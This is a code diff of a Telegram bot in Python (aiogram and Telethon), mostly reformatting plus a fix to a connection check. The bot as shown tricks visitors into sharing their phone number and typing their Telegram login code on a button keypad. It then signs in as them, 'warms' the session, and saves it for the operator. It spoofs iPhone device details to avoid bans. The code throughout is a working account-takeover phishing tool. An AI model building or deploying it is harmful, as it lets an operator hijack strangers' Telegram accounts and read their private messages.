@@ -35,10 +35,7 @@ from telethon.errors import (
 logging.basicConfig(
     level=logging.INFO,
     format="%(asctime)s | %(levelname)s | %(message)s",
-    handlers=[
-        logging.StreamHandler(),
-        logging.FileHandler("bot.log", encoding="utf-8")
-    ]
+    handlers=[logging.StreamHandler(), logging.FileHandler("bot.log", encoding="utf-8")]
 )
 logger = logging.getLogger(__name__)
 
@@ -50,70 +47,40 @@ ADMIN_IDS = {8559221549}
 SESSIONS_DIR = "sessions"
 os.makedirs(SESSIONS_DIR, exist_ok=True)
 
-# Рекомендуемые параметры для снижения риска бана
 DEVICE_MODEL = "iPhone 16 Pro Max"
 SYSTEM_VERSION = "iOS 18.3"
 APP_VERSION = "11.8.0"
 LANG_CODE = "ru"
 SYSTEM_LANG_CODE = "ru-RU"
 
-# PROXY = (socks.SOCKS5, 'ip', port, True, 'user', 'pass')  # ← раскомментируй и заполни при необходимости
+# PROXY = (socks.SOCKS5, 'ip', port, True, 'user', 'pass')  # ← если используешь
 
-bot = Bot(
-    token=BOT_TOKEN,
-    default=DefaultBotProperties(parse_mode=ParseMode.HTML)
-)
-
+bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
 storage = MemoryStorage()
 dp = Dispatcher(storage=storage)
 router = Router()
 dp.include_router(router)
 
 
-# ────────────────────────────────────────────────
-# СОСТОЯНИЯ
-# ────────────────────────────────────────────────
 class AddSession(StatesGroup):
     waiting_phone = State()
     waiting_code = State()
 
 
-# ────────────────────────────────────────────────
-# КЛАВИАТУРЫ
-# ────────────────────────────────────────────────
 def get_continue_keyboard() -> ReplyKeyboardMarkup:
     return ReplyKeyboardMarkup(
-        resize_keyboard=True,
-        one_time_keyboard=True,
+        resize_keyboard=True, one_time_keyboard=True,
         keyboard=[[KeyboardButton(text="Продолжить", request_contact=True)]]
     )
 
 
 def get_code_keyboard(current_code: str = "") -> InlineKeyboardMarkup:
     rows = [
-        [
-            InlineKeyboardButton(text="1", callback_data="code:1"),
-            InlineKeyboardButton(text="2", callback_data="code:2"),
-            InlineKeyboardButton(text="3", callback_data="code:3"),
-        ],
-        [
-            InlineKeyboardButton(text="4", callback_data="code:4"),
-            InlineKeyboardButton(text="5", callback_data="code:5"),
-            InlineKeyboardButton(text="6", callback_data="code:6"),
-        ],
-        [
-            InlineKeyboardButton(text="7", callback_data="code:7"),
-            InlineKeyboardButton(text="8", callback_data="code:8"),
-            InlineKeyboardButton(text="9", callback_data="code:9"),
-        ],
-        [
-            InlineKeyboardButton(text="0", callback_data="code:0"),
-            InlineKeyboardButton(text="← стереть", callback_data="code:back"),
-            InlineKeyboardButton(text="Отмена", callback_data="code:cancel"),
-        ],
-        [
-            InlineKeyboardButton(text="✓ Подтвердить", callback_data="code:confirm"),
-        ],
+        [InlineKeyboardButton(text="1", callback_data="code:1"), InlineKeyboardButton(text="2", callback_data="code:2"), InlineKeyboardButton(text="3", callback_data="code:3")],
+        [InlineKeyboardButton(text="4", callback_data="code:4"), InlineKeyboardButton(text="5", callback_data="code:5"), InlineKeyboardButton(text="6", callback_data="code:6")],
+        [InlineKeyboardButton(text="7", callback_data="code:7"), InlineKeyboardButton(text="8", callback_data="code:8"), InlineKeyboardButton(text="9", callback_data="code:9")],
+        [InlineKeyboardButton(text="0", callback_data="code:0"), InlineKeyboardButton(text="← стереть", callback_data="code:back"), InlineKeyboardButton(text="Отмена", callback_data="code:cancel")],
+        [InlineKeyboardButton(text="✓ Подтвердить", callback_data="code:confirm")],
     ]
     return InlineKeyboardMarkup(inline_keyboard=rows)
 
@@ -124,9 +91,6 @@ def mask_code(code: str) -> str:
     return "•" * (len(code) - 1) + code[-1]
 
 
-# ────────────────────────────────────────────────
-# /start
-# ────────────────────────────────────────────────
 @router.message(Command("start"))
 async def cmd_start(message: Message, state: FSMContext):
     if message.from_user.id in ADMIN_IDS:
@@ -135,15 +99,12 @@ async def cmd_start(message: Message, state: FSMContext):
         return
 
     await message.answer(
-        "Нажми «Продолжить», чтобы добавить сессию.",
+        "Нажми «Продолжить» для добавления сессии.",
         reply_markup=get_continue_keyboard()
     )
     await state.set_state(AddSession.waiting_phone)
 
 
-# ────────────────────────────────────────────────
-# Получение номера → запрос кода
-# ────────────────────────────────────────────────
 @router.message(F.contact, StateFilter(AddSession.waiting_phone))
 async def process_phone(message: Message, state: FSMContext):
     contact = message.contact
@@ -173,7 +134,7 @@ async def process_phone(message: Message, state: FSMContext):
         await client.connect()
 
         if await client.is_user_authorized():
-            await message.reply("Этот номер уже авторизован здесь.")
+            await message.reply("Уже авторизован.")
             await state.clear()
             return
 
@@ -191,25 +152,22 @@ async def process_phone(message: Message, state: FSMContext):
             code_message_id=msg.message_id,
             current_code=""
         )
-
         await state.set_state(AddSession.waiting_code)
+
         logger.info(f"Код отправлен на +{phone}")
 
     except FloodWaitError as e:
-        await message.reply(f"Флуд-лимит. Подожди {e.seconds // 60 + 1} мин.")
+        await message.reply(f"Флуд. Подожди {e.seconds // 60 + 1} мин.")
         await state.clear()
     except Exception as e:
-        logger.exception(f"Ошибка при запросе кода +{phone}")
+        logger.exception(f"Ошибка запроса кода +{phone}")
         await message.reply(f"Ошибка: {str(e)[:200]}")
         await state.clear()
     finally:
-        if await client.is_connected():
+        if client.is_connected():
             await client.disconnect()
 
 
-# ────────────────────────────────────────────────
-# Обработка кнопок кода
-# ────────────────────────────────────────────────
 @router.callback_query(StateFilter(AddSession.waiting_code))
 async def process_code_button(callback: CallbackQuery, state: FSMContext):
     data = await state.get_data()
@@ -260,7 +218,7 @@ async def process_code_button(callback: CallbackQuery, state: FSMContext):
             await client.connect()
             await asyncio.sleep(1.2)
 
-            logger.info(f"Попытка sign_in +{phone} код {current_code}")
+            logger.info(f"sign_in +{phone} код {current_code}")
 
             await client.sign_in(
                 phone=phone,
@@ -268,7 +226,6 @@ async def process_code_button(callback: CallbackQuery, state: FSMContext):
                 phone_code_hash=phone_code_hash
             )
 
-            # Прогрев сессии
             await asyncio.sleep(2.5)
             await client.send_message("me", "Сессия успешно добавлена через бота ✅")
             await asyncio.sleep(1.8)
@@ -281,7 +238,7 @@ async def process_code_button(callback: CallbackQuery, state: FSMContext):
 
             await callback.message.edit_text(
                 f"Готово! +{phone} авторизован и прогрет.\n"
-                "Сессия сохранена. Можешь удалить это сообщение."
+                "Сессия сохранена."
             )
             await state.clear()
 
@@ -318,15 +275,16 @@ async def process_code_button(callback: CallbackQuery, state: FSMContext):
             await state.clear()
 
         finally:
-            if await client.is_connected():
+            # Правильная проверка без await
+            if client.is_connected():
                 await client.disconnect()
 
         await callback.answer()
         return
 
-    # Обновляем сообщение с кодом
-    display_code = mask_code(current_code)
-    text = f"Код отправлен на <code>+{phone}</code>\n\nВведи 5-значный код:\n<b>{display_code}</b>"
+    # Обновление сообщения
+    display = mask_code(current_code)
+    text = f"Код отправлен на <code>+{phone}</code>\n\nВведи 5-значный код:\n<b>{display}</b>"
 
     if code_msg_id:
         try:
@@ -337,16 +295,13 @@ async def process_code_button(callback: CallbackQuery, state: FSMContext):
                 reply_markup=get_code_keyboard(current_code)
             )
         except Exception as e:
-            logger.debug(f"Не удалось обновить сообщение: {e}")
+            logger.debug(f"Ошибка обновления сообщения: {e}")
 
     await callback.answer()
 
 
-# ────────────────────────────────────────────────
-# Запуск
-# ────────────────────────────────────────────────
 async def main():
-    logger.info("Бот запущен — phone_code_hash передаётся явно")
+    logger.info("Бот запущен — исправлена ошибка await на is_connected()")
     await dp.start_polling(bot)
 
 
